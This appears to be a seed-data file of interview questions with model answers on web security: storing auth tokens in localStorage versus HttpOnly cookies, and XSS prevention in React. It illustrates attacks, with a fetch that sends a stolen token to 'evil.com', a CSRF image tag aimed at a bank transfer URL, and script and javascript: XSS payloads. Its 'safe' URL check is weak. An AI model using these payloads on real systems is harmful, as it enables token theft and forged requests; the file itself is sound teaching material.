// ============================================================================
// SECURITY & AUTHENTICATION
// ============================================================================

import { CreateQuestionInput, QUESTION_CATEGORIES } from "@/types";

export const securityAuthQuestions: CreateQuestionInput[] = [
  {
    category: QUESTION_CATEGORIES.SECURITY_AUTH,
    difficulty: "senior",
    question:
      "Compare localStorage vs HttpOnly cookies for storing authentication tokens. What are the security implications of each approach?",
    answer: `## Security Comparison

| Aspect | localStorage | HttpOnly Cookie |
|--------|-------------|-----------------|
| XSS Vulnerability | **HIGH** - JS can read | **LOW** - JS cannot access |
| CSRF Vulnerability | **LOW** - Not auto-sent | **HIGH** - Auto-sent |
| Subdomains | Same origin only | Configurable |

## XSS Attack Vector

\`\`\`typescript
// localStorage - vulnerable to XSS
const stolenToken = localStorage.getItem('authToken');
fetch('https://evil.com/steal', { body: stolenToken });

// HttpOnly cookie - protected from XSS
document.cookie; // HttpOnly cookies not visible
\`\`\`

## CSRF Attack Vector

\`\`\`html
<!-- HttpOnly cookie - vulnerable to CSRF -->
<img src="https://bank.com/transfer?to=attacker&amount=1000" />
\`\`\`

## Best Practice: Hybrid Approach

\`\`\`typescript
// Server
res.cookie('refreshToken', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  path: '/api/auth/refresh',
});

// Client - store access token in memory
class AuthManager {
  private accessToken: string | null = null;
  
  async fetch(url: string, options: RequestInit = {}) {
    return fetch(url, {
      ...options,
      credentials: 'include',
      headers: {
        ...options.headers,
        'Authorization': \`Bearer \${this.accessToken}\`,
      },
    });
  }
}
\`\`\`

**Recommendation:**
- Access Token: Memory (15 min expiry)
- Refresh Token: HttpOnly cookie
- Add CSRF tokens for cookie-based requests`,
    keyPoints: [
      "Understands XSS vs CSRF attack vectors",
      "Knows HttpOnly prevents JavaScript access",
      "Recommends hybrid approach",
      "Implements CSRF protection",
    ],
    followUpQuestions: [
      "How would you handle token refresh in a SPA?",
      "What about subdomain cookie sharing?",
    ],
    relatedTopics: ["xss", "csrf", "jwt", "session-management"],
    source: "seed",
    commonAt: ["Any company handling auth"],
  },
  {
    category: QUESTION_CATEGORIES.SECURITY_AUTH,
    difficulty: "mid",
    question:
      "What is XSS (Cross-Site Scripting)? Explain the different types and how to prevent them in a React application.",
    answer: `## XSS Types

### 1. Stored XSS
Script stored in database, served to all users.

### 2. Reflected XSS
Script reflected from URL parameters.

### 3. DOM-based XSS
Client-side JS manipulates DOM unsafely.

## React's Built-in Protection

\`\`\`tsx
// ✅ Safe - React escapes this
function Comment({ text }: { text: string }) {
  return <p>{text}</p>;
}
// "<script>alert('xss')</script>" → displayed as text
\`\`\`

## React XSS Vulnerabilities

### dangerouslySetInnerHTML

\`\`\`tsx
// ❌ Dangerous
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// ✅ Safe - sanitize first
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ 
  __html: DOMPurify.sanitize(userInput) 
}} />
\`\`\`

### javascript: URLs

\`\`\`tsx
// ❌ Vulnerable
<a href={userUrl}>Link</a>
// Attacker: javascript:alert('XSS')

// ✅ Safe - validate protocol
const safeUrl = url.startsWith('http') ? url : '#';
\`\`\`

## Prevention Checklist
- Use React's default escaping
- Sanitize HTML with DOMPurify
- Validate URLs (block javascript:)
- Implement Content Security Policy`,
    keyPoints: [
      "Can explain stored, reflected, DOM-based XSS",
      "Understands React's automatic escaping",
      "Knows dangerous patterns",
      "Implements sanitization",
    ],
    followUpQuestions: [
      "How does CSP help prevent XSS?",
      "What about XSS in SSR contexts?",
    ],
    relatedTopics: ["security", "csp", "sanitization"],
    source: "seed",
    commonAt: ["Any security-conscious company"],
  },
];
